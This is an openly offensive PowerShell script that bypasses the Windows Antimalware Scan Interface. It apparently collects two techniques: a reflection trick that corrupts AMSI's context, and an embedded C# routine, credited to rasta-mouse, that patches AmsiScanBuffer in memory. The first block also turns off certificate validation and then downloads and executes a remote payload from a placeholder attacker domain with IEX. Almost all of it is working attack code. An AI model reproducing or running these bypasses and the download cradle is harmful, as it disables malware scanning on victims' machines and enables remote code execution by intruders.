$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem);
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
$e=new-object net.webclient;
$e.proxy=[Net.WebRequest]::GetSystemWebProxy();
$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
IEX $e.downloadstring('http://attacker-trusted-domain/pwn');

######################################################################################################################################
[**] update 08/01/2019 from rasta-mouse's AmsiScanBufferBypass project (https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/):
######################################################################################################################################

$Ref = (
"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
)

$Source = @"
using System;
using System.Runtime.InteropServices;

namespace Bypass
{
    public class AMSI
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero) { return 1; }

            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
            if (ASBPtr == IntPtr.Zero) { return 1; }

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;

            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }

            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
            MoveMemory(ASBPtr, unmanagedPointer, 6);

            return 0;
        }
    }
}
"@

Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
